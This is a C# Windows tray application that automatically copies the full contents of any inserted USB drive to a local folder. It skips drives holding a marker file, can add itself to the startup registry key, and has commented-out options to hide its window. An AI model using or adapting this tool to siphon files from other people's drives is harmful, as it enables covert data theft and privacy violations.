using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace USBFilesCopier
{
    public partial class UsbFilesCopier : Form
    {
        /*
        [DllImport("user32.dll")]
        public static extern bool RegisterHotKey(IntPtr hWnd, int id, int fsModifiers, int vlc);
        [DllImport("user32.dll")]
        public static extern bool UnregisterHotKey(IntPtr hWnd, int id);

        s*/

        /*
        const int Exit_Hotkey_Id = 1;
        const int AddToStartup_Hotkey_Id = 2;
        const int RemoveToStartup_Hotkey_Id = 3;
        */
        public UsbFilesCopier()
        {
            InitializeComponent();



            // Modifier keys codes: Alt = 1, Ctrl = 2, Shift = 4, Win = 8
            // Compute the addition of each combination of the keys you want to be pressed
            // ALT+CTRL = 1 + 2 = 3 , CTRL+SHIFT = 2 + 4 = 6...


            /*

            RegisterHotKey(this.Handle, AddToStartup_Hotkey_Id, 6, (int)Keys.D5);
            RegisterHotKey(this.Handle, RemoveToStartup_Hotkey_Id, 6, (int)Keys.D6);
            RegisterHotKey(this.Handle, Exit_Hotkey_Id, 6, (int)Keys.D7);

            */



        }


        private const int WM_DEVICECHANGE = 0x219;
        private const int DBT_DEVICEARRIVAL = 0x8000;
        private const int DBT_DEVICEREMOVECOMPLETE = 0x8004;
        private const int DBT_DEVTYP_VOLUME = 0x00000002;

        [StructLayout(LayoutKind.Sequential)]
        public struct DevBroadcastVolume
        {
            public int Size;
            public int DeviceType;
            public int Reserved;
            public int Mask;
            public Int16 Flags;
        }
        

        protected override void WndProc(ref Message m)
        {


            /*
            if (m.Msg == 0x0312 && m.WParam.ToInt32() == Exit_Hotkey_Id)
            {
                Application.Exit();
            }

            if (m.Msg == 0x0312 && m.WParam.ToInt32() == AddToStartup_Hotkey_Id)
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue("USBFilesCopier", Application.ExecutablePath.ToString());
                MessageBox.Show("USBFilesCopier added to Startup");
            }
            if (m.Msg == 0x0312 && m.WParam.ToInt32() == RemoveToStartup_Hotkey_Id)
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.DeleteValue("USBFilesCopier", false);
                MessageBox.Show("USBFiles Copier removed to Startup");
            }

            */
            base.WndProc(ref m);


            switch (m.Msg)
            {
                case WM_DEVICECHANGE:
                    switch ((int)m.WParam)
                    {
                        case DBT_DEVICEARRIVAL:
                            int devType = Marshal.ReadInt32(m.LParam, 4);
                            if (devType == DBT_DEVTYP_VOLUME)
                            {
                                DevBroadcastVolume vol;
                                vol = (DevBroadcastVolume)
                                   Marshal.PtrToStructure(m.LParam,
                                   typeof(DevBroadcastVolume));

                                int mask = vol.Mask; String binaryMask = Convert.ToString(vol.Mask, 2);
                                int str = binaryMask.Length - binaryMask.IndexOf('1') - 1;
                                char letter = (char)('A' + str);


                                DriveInfo dinfo = getUsbInfo(letter.ToString());
                                string destination = "C:/Usb/" + dinfo.VolumeLabel + "_" + DateTime.Now.ToString("yyyyMMddHHmmssfff");
                                if (!Directory.Exists(destination))
                                    Directory.CreateDirectory(destination);

                                string path = destination + "/DriveInfo.txt";
                                if (!File.Exists(path))
                                {
                                    using (StreamWriter sw = File.CreateText(path))
                                    {

                                        sw.WriteLine(string.Format("{0, -30}{1, -15}", "Available Free Space: ", dinfo.AvailableFreeSpace));
                                        sw.WriteLine(string.Format("{0, -30}{1, -15}", "Total Size: ", dinfo.TotalFreeSpace));
                                        sw.WriteLine(string.Format("{0, -30}{1, -15}", "Total Size: ", dinfo.TotalSize));
                                        sw.WriteLine(string.Format("{0, -30}{1, -15}", "Drive Format: ", dinfo.DriveFormat));
                                        sw.WriteLine(string.Format("{0, -30}{1, -15}", "Drive Type: ", dinfo.DriveType));
                                        sw.WriteLine(string.Format("{0, -30}{1, -15}", "Name: ", dinfo.Name));
                                        sw.WriteLine(string.Format("{0, -30}{1, -15}", "Root Directory: ", dinfo.RootDirectory));
                                        sw.WriteLine(string.Format("{0, -30}{1, -15}", "Volume Label: ", dinfo.VolumeLabel));
                                    }
                                }

                                DirectoryInfo source = new DirectoryInfo(dinfo.Name);
                                DirectoryInfo target = new DirectoryInfo(destination);
                                if(!File.Exists(dinfo.Name + "/itcstutorial.xyz.txt"))
                                CopyAll(source, target);
                            }

                            break;

                        case DBT_DEVICEREMOVECOMPLETE:
                            break;

                    }
                    break;
            }




        }
        private DriveInfo getUsbInfo(string driveLetter)
        {
            DriveInfo info = new DriveInfo(driveLetter);
            return info;
        }

        public static void CopyAll(DirectoryInfo source, DirectoryInfo target)
        {
            try
            {
                Directory.CreateDirectory(target.FullName);
                foreach (FileInfo fi in source.GetFiles())
                {
                    fi.CopyTo(Path.Combine(target.FullName, fi.Name), true);
                }
                foreach (DirectoryInfo diSourceSubDir in source.GetDirectories())
                {
                    DirectoryInfo nextTargetSubDir =
                        target.CreateSubdirectory(diSourceSubDir.Name);
                    CopyAll(diSourceSubDir, nextTargetSubDir);
                }
            }
            catch (Exception ex) { }

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //this.ShowInTaskbar = false;
            //this.WindowState = FormWindowState.Minimized;
            //this.Visible = false;
        }

        private void UsbFilesCopier_SizeChanged(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                notifyIcon1.BalloonTipTitle = "USB File Copier";
            }
        }

        private void addToStartupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("USBFilesCopier", Application.ExecutablePath.ToString());
            notifyIcon1.BalloonTipText = "USBFiles Copier added to Startup";
            notifyIcon1.ShowBalloonTip(1000);
        }

        private void removeToStartupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.DeleteValue("USBFilesCopier", false);
            notifyIcon1.BalloonTipText = "USBFiles Copier removed to Startup";
            notifyIcon1.ShowBalloonTip(1000);
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
    }
}
